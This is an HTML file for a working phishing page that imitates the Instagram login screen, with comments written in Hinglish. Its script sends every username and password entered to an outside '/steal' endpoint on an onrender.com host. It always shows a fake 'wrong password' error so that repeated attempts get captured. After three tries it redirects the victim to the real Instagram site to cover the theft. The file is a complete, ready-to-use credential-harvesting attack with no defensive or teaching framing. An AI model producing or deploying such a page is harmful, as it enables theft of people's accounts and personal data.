<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .box {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        .logo { font-size: 40px; margin-bottom: 10px; }
        h2 { font-weight: 400; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            font-size: 16px;
            background: #fafafa;
        }
        input:focus { outline: none; border-color: #0095f6; }
        button {
            width: 100%;
            padding: 14px;
            margin-top: 12px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .error {
            color: #ed4956;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
        .footer { margin-top: 20px; font-size: 14px; color: #8e8e8e; }
        .attempt-counter {
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">📸</div>
        <h2>Instagram</h2>
        <input type="text" id="username" placeholder="Username or email">
        <input type="password" id="password" placeholder="Password">
        <button onclick="login()">Log In</button>
        <div class="error" id="error">⚠️ Wrong password. Try again.</div>
        <div class="attempt-counter" id="attempt">Attempt 1 of 3</div>
        <div class="footer">Forgot password?</div>
    </div>

    <script>
        var attemptCount = 0;
        var maxAttempts = 3;
        var username = '';
        var password = '';
        
        function login() {
            username = document.getElementById('username').value;
            password = document.getElementById('password').value;
            attemptCount++;
            
            if (username === '' || password === '') {
                document.getElementById('error').style.display = 'block';
                return;
            }
            
            // HAR ATTEMPT CAPTURE KARO
            fetch('https://hacking-project.onrender.com/steal?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&attempt=' + attemptCount);
            
            // HAMESHA ERROR DIKHAO
            document.getElementById('error').style.display = 'block';
            document.getElementById('attempt').textContent = 'Attempt ' + attemptCount + ' of ' + maxAttempts;
            
            // AGAR 3 ATTEMPTS HO GAYE TOH REAL INSTAGRAM PE REDIRECT
            if (attemptCount >= maxAttempts) {
                document.getElementById('error').textContent = '⚠️ Too many attempts. Redirecting...';
                setTimeout(function() {
                    window.location.href = 'https://instagram.com';
                }, 1500);
            } else {
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
            }
        }
    </script>
</body>
</html>
